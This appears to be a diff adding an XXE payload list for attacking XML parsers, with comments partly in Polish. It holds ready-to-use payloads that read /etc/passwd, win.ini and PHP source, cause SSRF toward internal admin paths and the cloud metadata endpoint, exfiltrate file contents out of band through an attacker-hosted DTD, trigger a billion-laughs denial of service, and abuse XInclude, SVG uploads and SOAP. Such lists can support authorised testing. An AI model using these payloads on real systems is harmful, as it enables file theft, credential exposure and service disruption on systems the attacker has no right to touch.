@@ -1,0 +1,38 @@
+# === Classic — file read (Linux) ===
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+
+# === Classic — file read (Windows) ===
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>
+
+# === Wewnątrz parametru (gdy <r> jest immutable) ===
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY x '%d;'>">%e;]><r>&x;</r>
+
+# === PHP wrapper (base64) — bypass binary content errors ===
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><r>&x;</r>
+
+# === SSRF via XXE ===
+# Wymagana podmiana {{TARGET}}
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://{{TARGET}}/internal/admin">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>
+
+# === Out-of-band exfil (OOB) ===
+# Wymagana podmiana {{OOB}} — DTD na atakującym
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "http://{{OOB}}/x.dtd">%ext;]>
+# x.dtd content (host na atakującym):
+# <!ENTITY % p SYSTEM "file:///etc/passwd"><!ENTITY % w "<!ENTITY &#x25; o SYSTEM 'http://{{OOB}}/?d=%p;'>">%w;%o;
+
+# === Billion laughs (DoS) — używaj świadomie ===
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>
+
+# === XInclude (gdy XML processor wspiera) ===
+<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>
+
+# === SVG XXE (file upload) ===
+<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
+
+# === Office Open XML / SOAP triggers ===
+<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY x SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body>&x;</soap:Body></soap:Envelope>
+
+# === Parameter entity blind detection ===
+<!DOCTYPE r [<!ENTITY % p SYSTEM "http://{{OOB}}/">%p;]>
